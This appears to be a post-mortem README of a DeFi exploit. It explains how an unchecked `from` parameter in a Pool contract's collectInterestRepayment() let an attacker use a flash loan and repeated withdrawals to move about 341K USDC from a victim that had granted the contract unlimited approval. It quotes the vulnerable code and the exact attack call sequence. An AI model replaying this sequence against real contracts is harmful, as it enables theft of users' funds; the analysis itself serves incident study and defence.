# 0x0689a-330K-PoC

## Summary

On block **23,924,517**, the Pool contract at `0x0689aa2234d06Ac0d04cdac874331d287aFA4B43` was exploited for **330,999 USDC** through a critical access control vulnerability in the `collectInterestRepayment()` function.

## Root cause

EOA had given an unlimited `USDC approval` to the Pool contract, the vulnerable `collectInterestRepayment()` function allows ANY caller to specify ANY `from` address, enabling the attacker to `drain` the entire EOA USDC balance directly to the Pool, then withdraw it.

**Tx Hash** `0x3a8bde0a17e04f6a119ae2f28e6b56ac736feb70761e2fa97cac25f816f751c2`

**Block** 23,924,517

**Exploit** `0x716420E787D20B255EeEd9f6D442fa454f1d7d5B`

**Victim EOA** `0x526C7665C5dd9cD7102C6d42D407a0d9DC1e431d`

**Funds Stolen** 340,567 USDC

**Profit** 330,999 USDC

**Flashloan** 1,000 USDC

---

## Details

### `from` Address in `collectInterestRepayment()`

The function accepts ANY address as the `from` parameter without any validation. This creates a **massive siphon vulnerability** for anyone who has approved the Pool contract.

### Vector

```solidity
// Pool.sol - Line 80
function collectInterestRepayment(address from, uint amount) external whenNotPaused {
    doERC20Transfer(from, address(this), amount);  // <- 'from' can be ANY address
    uint increment = amount.mul(mantissa).div(totalShares);
    sharePrice = sharePrice + increment;
    emit InterestCollected(from, amount);
}

// Internal transfer function - Line 127
function doERC20Transfer(address from, address to, uint amount) internal returns (bool) {
    ERC20UpgradeSafe erc20 = ERC20UpgradeSafe(erc20address);
    uint balanceBefore = erc20.balanceOf(to);
    bool success = erc20.transferFrom(from, to, amount);  // <- victim approval
    uint balanceAfter = erc20.balanceOf(to);
    require(balanceAfter >= balanceBefore, "Token Transfer Overflow Error");
    return success;
}
```

---

## Exploit Flow

[Exploit TX](https://app.blocksec.com/explorer/tx/eth/0x3a8bde0a17e04f6a119ae2f28e6b56ac736feb70761e2fa97cac25f816f751c2)

<img width="1444" height="353" alt="image" src="https://github.com/user-attachments/assets/cb48565c-43fd-4b29-b99d-988ed0a9c901" />

// Step 1 - Flashloan

```
Uniswap V3 flash() → 1,000 USDC
```

// Step 2 - Deposit into Pool (to have withdrawal rights)

```
approve(Pool, unlimited)
deposit(1,000 USDC)
→ Attacker now has shares in the pool and can withdraw
```

// Step 3 - EXPLOIT

```
collectInterestRepayment(0x526C7665C5dd9cD7102C6d42D407a0d9DC1e431d, 340,567,004,224)

→ Pool calls: USDC.transferFrom(victim, pool, 340,567 USDC)
→ This SUCCEEDS because victim had approved Pool for unlimited USDC
→ EOA entire USDC balance is now in the Pool
```

// Step 4 - Withdrawals (35 total)

```
withdraw(10,000 USDC) × 33  → 330,000 USDC
withdraw(10,000 USDC) × 1   → 10,000 USDC
withdraw(1,000 USDC) × 1    → 1,000 USDC
─────────────────────────────────────────
Total withdrawn:             ~341,000 USDC

(because limited by transactionLimit of 10,000 USDC per tx)
```

<img width="880" height="532" alt="image" src="https://github.com/user-attachments/assets/4a08c0f4-f681-4301-804d-1c0050563639" />


// Step 5 - Repay & Profit

```
Repay to Uniswap V3: 1,001 USDC (principal + fee)
Profit transferred: 330,999 USDC → 0x2C2EC35549BFB2f983C2025Dfb2ab1c0f69c1ee9
```

<img width="880" height="392" alt="image" src="https://github.com/user-attachments/assets/0e3e79d5-a39f-496d-bcd8-02cc3681288f" />


The flashloan was used because the attacker didn't need any initial capital - they borrowed 1,000 USDC, used it to establish withdrawal rights, siphoned 340K USDC from the victim, withdrew everything, repaid the loan, and kept 330K profit.

---

`0x716420E787D20B255EeEd9f6D442fa454f1d7d5B` | Exploit

`0x526C7665C5dd9cD7102C6d42D407a0d9DC1e431d` | Victim EOA (had UNLIMITED approval to Pool for USDC)

`0x0689aa2234d06Ac0d04cdac874331d287aFA4B43` | Vulnerable Pool (Proxy)

`0x7dbE30FDE1Eca6856806fF14fc456ec6791c73FE` | Pool Implementation (delegatecall)

`0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640` | Uniswap V3 USDC/WETH Pool (Flashloan Source)

`0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48` | USDC Token

`0x2C2EC35549BFB2f983C2025Dfb2ab1c0f69c1ee9` | Profit Receiver (Attacker EOA)

---

## References

- [Attack Transaction](https://etherscan.io/tx/0x3a8bde0a17e04f6a119ae2f28e6b56ac736feb70761e2fa97cac25f816f751c2)
- [Vulnerable Pool Proxy](https://etherscan.io/address/0x0689aa2234d06Ac0d04cdac874331d287aFA4B43)
- [Pool Implementation](https://etherscan.io/address/0x7dbE30FDE1Eca6856806fF14fc456ec6791c73FE)
- [Exploit](https://etherscan.io/address/0x716420E787D20B255EeEd9f6D442fa454f1d7d5B)
- [Victim EOA](https://etherscan.io/address/0x526C7665C5dd9cD7102C6d42D407a0d9DC1e431d)
- [Profit Receiver](https://etherscan.io/address/0x2C2EC35549BFB2f983C2025Dfb2ab1c0f69c1ee9)

